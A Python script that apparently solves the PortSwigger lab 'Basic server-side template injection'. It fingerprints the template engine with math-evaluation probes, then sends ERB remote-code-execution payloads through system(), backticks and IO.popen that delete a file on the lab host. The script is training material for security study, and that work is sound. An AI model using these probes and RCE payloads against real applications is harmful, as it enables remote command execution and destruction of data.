#!/usr/bin/env python3
"""
Basic server-side template injection
PortSwigger Web Security Academy -- Server-Side Template Injection

Companion script for the writeup: 01-basic-server-side-template-injection.md

What this does:
    Runs the same math-eval probe table our SSTI capability tool uses to
    fingerprint the template engine behind the reflected `message` parameter
    (Jinja2/Twig, Freemarker/Velocity, ERB, Pug, Smarty, in that order),
    confirms ERB via `<%= 7*7 %>` -> 49, then sends ERB's `system()` RCE
    payload to delete Carlos's file.

Usage:
    python 01-basic-server-side-template-injection.py <lab-url>
    e.g. python 01-basic-server-side-template-injection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import sys
import httpx

MATH_PROBES = [
    ("{{7*7}}", "49", "jinja2_or_twig"),
    ("${7*7}", "49", "freemarker_or_velocity"),
    ("<%= 7*7 %>", "49", "erb"),
    ("#{7*7}", "49", "pug"),
    ("{7*7}", "49", "smarty"),
]

# Our tool's exploiter tries these in order for a confirmed ERB point.
ERB_RCE_PAYLOADS = [
    "<%= system('{CMD}') %>",
    "<%= `{CMD}` %>",
    "<%= IO.popen('{CMD}').read %>",
]


def _disambiguate_jinja_twig(client: httpx.Client, lab_url: str) -> str:
    r = client.get(lab_url, params={"message": "{{7*'7'}}"})
    if "49" in r.text:
        return "twig"
    if "7777777" in r.text:
        return "jinja2"
    return "jinja2_or_twig"


def detect_engine(client: httpx.Client, lab_url: str) -> str | None:
    for payload, expected, hint in MATH_PROBES:
        r = client.get(lab_url, params={"message": payload})
        if expected in r.text:
            if hint == "jinja2_or_twig":
                return _disambiguate_jinja_twig(client, lab_url)
            return hint
    return None


def execute_rce(client: httpx.Client, lab_url: str, command: str) -> str | None:
    baseline = client.get(lab_url).text
    for payload_tpl in ERB_RCE_PAYLOADS:
        payload = payload_tpl.replace("{CMD}", command)
        r = client.get(lab_url, params={"message": payload})
        output = r.text.replace(baseline, "").strip() if baseline in r.text else r.text
        if output and output != r.text:
            return output
    return None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    print("[*] Running math-eval probe table against ?message=")
    engine = detect_engine(client, lab_url)
    if engine != "erb":
        print(f"[-] Expected ERB, detected: {engine!r}. Aborting.")
        return
    print("[+] ERB confirmed -- <%= 7*7 %> -> 49")

    print("[*] Sending ERB system() RCE payload to delete morale.txt")
    execute_rce(client, lab_url, "rm /home/carlos/morale.txt")

    print("[*] Verifying with a cat-style payload")
    verify_output = execute_rce(client, lab_url, "cat /home/carlos/morale.txt 2>&1")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- morale.txt deleted via ERB RCE.")
    elif verify_output and "No such file" in verify_output:
        print("[+] morale.txt confirmed missing -- reload the lab home page for the banner.")
    else:
        print("[-] Not solved yet -- inspect the response manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
